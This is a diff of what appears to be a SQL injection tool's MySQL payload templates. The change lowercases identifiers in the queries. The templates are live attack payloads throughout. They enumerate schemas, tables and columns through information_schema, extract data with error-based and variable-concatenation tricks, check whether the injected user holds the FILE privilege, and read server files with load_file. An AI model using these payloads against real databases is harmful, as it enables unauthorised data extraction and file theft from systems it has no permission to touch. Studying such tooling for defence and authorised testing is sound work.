@@ -21,11 +21,11 @@ resource:
        separator ${separator_cell_hex}
    ) from (
        select
-           cast(SCHEMA_NAME as char) r,
-           cast(count(TABLE_NAME) as char) q
-       from INFORMATION_SCHEMA.tables
-       right join INFORMATION_SCHEMA.schemata
-       on SCHEMA_NAME = table_schema
+           cast(schema_name as char) r,
+           cast(count(table_name) as char) q
+       from information_schema.tables
+       right join information_schema.schemata
+       on schema_name = table_schema
        group by r
        /* Required by Error Extractvalue */
        order by 1
@@ -43,10 +43,10 @@ resource:
        separator ${separator_cell_hex}
    ) from (
        select
-           cast(TABLE_NAME as char) r,
+           cast(table_name as char) r,
            cast(ifnull(table_rows, 0x30) as char) q
        from information_schema.tables
-       where TABLE_SCHEMA = 0x${database.hex}
+       where table_schema = 0x${database.hex}
        /* Required by Error Extractvalue */
        order by 1
        ${limit}
@@ -62,10 +62,10 @@ resource:
        order by n
        separator ${separator_cell_hex}
    ) from (
-       select cast(COLUMN_NAME as char) n
+       select cast(column_name as char) n
        from information_schema.columns
-       where TABLE_SCHEMA = 0x${database.hex}
-       and TABLE_NAME = 0x${table.hex}
+       where table_schema = 0x${database.hex}
+       and table_name = 0x${table.hex}
        /* Required by Error Extractvalue */
        order by 1
        ${limit}
@@ -99,31 +99,31 @@ resource:
   database: |
    select group_concat(
        ${enclose_value_hex},
-       SCHEMA_NAME,
+       schema_name,
        '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
    )
-   from INFORMATION_SCHEMA.schemata
+   from information_schema.schemata
    ${limit}
 
   table: |
    select group_concat(
        ${enclose_value_hex},
-       TABLE_NAME,
+       table_name,
        '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
    )
    from information_schema.tables
-   where TABLE_SCHEMA = '${database}'
+   where table_schema = '${database}'
    ${limit}
 
   column: |
    select group_concat(
        ${enclose_value_hex},
-       COLUMN_NAME,
+       column_name,
        '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
    )
    from information_schema.columns
-   where TABLE_SCHEMA = '${database}'
-   and TABLE_NAME = '${table}'
+   where table_schema = '${database}'
+   and table_name = '${table}'
    ${limit}
 
   row:
@@ -144,33 +144,33 @@ resource:
    select concat(@a:=0,(select count(*) from (
        select concat(
            ${enclose_value_hex},
-           cast(SCHEMA_NAME as char),
+           cast(schema_name as char),
            '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
        ) a
-       from INFORMATION_SCHEMA.schemata
+       from information_schema.schemata
    )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
 
   table: |
    select concat(@a:=0,(select count(*) from (
        select concat(
            ${enclose_value_hex},
-           cast(TABLE_NAME as char),
+           cast(table_name as char),
            '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
        ) a
        from information_schema.tables
-       where TABLE_SCHEMA = 0x${database.hex}
+       where table_schema = 0x${database.hex}
    )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
 
   column: |
    select concat(@a:=0,(select count(*) from (
        select concat(
            ${enclose_value_hex},
-           cast(COLUMN_NAME as char),
+           cast(column_name as char),
            '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
        ) a
        from information_schema.columns
-       where TABLE_SCHEMA = 0x${database.hex}
-       and TABLE_NAME = 0x${table.hex}
+       where table_schema = 0x${database.hex}
+       and table_name = 0x${table.hex}
    )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
 
   row:
@@ -191,9 +191,9 @@ resource:
   privilege: |
    cast((
        select if(count(*) = 1, 0x74727565, 0x66616c7365)
-       from INFORMATION_SCHEMA.USER_PRIVILEGES
+       from information_schema.user_privileges
        where grantee = concat(0x27, replace(cast(current_user as char), 0x40, 0x274027), 0x27)
-       and PRIVILEGE_TYPE = 0x46494c45
+       and privilege_type = 0x46494c45
    ) as char)
   read: cast(load_file(0x${filepath.hex}) as char)
   write:
